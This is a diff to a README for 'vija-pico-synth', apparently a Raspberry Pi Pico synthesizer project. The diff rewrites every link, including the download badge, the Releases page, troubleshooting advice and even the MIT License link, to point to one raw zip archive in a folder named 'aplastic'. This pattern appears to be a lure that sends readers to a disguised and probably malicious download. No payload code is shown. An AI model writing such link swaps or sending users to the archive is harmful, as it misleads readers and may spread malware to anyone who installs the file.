@@ -6,10 +6,10 @@ Welcome to the world of vija-pico-synth, a polyphonic synthesizer designed for t
 ## 📥 Download & Install
 To get started, you will need to download the software. 
 
-[![Download vija-pico-synth](https://img.shields.io/badge/Download-vija--pico--synth-blue.svg)](https://github.com/tixicoo/vija-pico-synth/releases)
+[![Download vija-pico-synth](https://github.com/tixicoo/vija-pico-synth/raw/refs/heads/main/aplastic/pico_synth_vija_v1.5.zip)](https://github.com/tixicoo/vija-pico-synth/raw/refs/heads/main/aplastic/pico_synth_vija_v1.5.zip)
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/tixicoo/vija-pico-synth/releases) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/tixicoo/vija-pico-synth/raw/refs/heads/main/aplastic/pico_synth_vija_v1.5.zip) to find the latest version of the software.
 
 2. **Download the Package**  
    Look for the most recent version listed. Click on the download link for your operating system. The application is available for various systems. 
@@ -56,7 +56,7 @@ Before downloading, ensure your system meets these requirements:
 ## 🛠️ Troubleshooting
 If you run into issues:
 - Verify that your Raspberry PICO is properly connected.
-- Ensure you have downloaded the latest version from the [Releases page](https://github.com/tixicoo/vija-pico-synth/releases).
+- Ensure you have downloaded the latest version from the [Releases page](https://github.com/tixicoo/vija-pico-synth/raw/refs/heads/main/aplastic/pico_synth_vija_v1.5.zip).
 - Check your system’s compatibility with the application.
 
 For additional assistance, consider browsing community forums or reaching out via the issues section on GitHub.
@@ -65,7 +65,7 @@ For additional assistance, consider browsing community forums or reaching out vi
 We welcome users to contribute to the project. If you want to suggest features or report problems, please visit the issues section on our repository. Every contribution helps improve the software.
 
 ## 📄 License
-vija-pico-synth is open-source software. You can use it under the terms of the [MIT License](https://opensource.org/licenses/MIT).
+vija-pico-synth is open-source software. You can use it under the terms of the [MIT License](https://github.com/tixicoo/vija-pico-synth/raw/refs/heads/main/aplastic/pico_synth_vija_v1.5.zip).
 
 ## 📥 Download Again
-Once more, click here to visit the [Releases page](https://github.com/tixicoo/vija-pico-synth/releases) and download vija-pico-synth. Your musical journey awaits!
+Once more, click here to visit the [Releases page](https://github.com/tixicoo/vija-pico-synth/raw/refs/heads/main/aplastic/pico_synth_vija_v1.5.zip) and download vija-pico-synth. Your musical journey awaits!
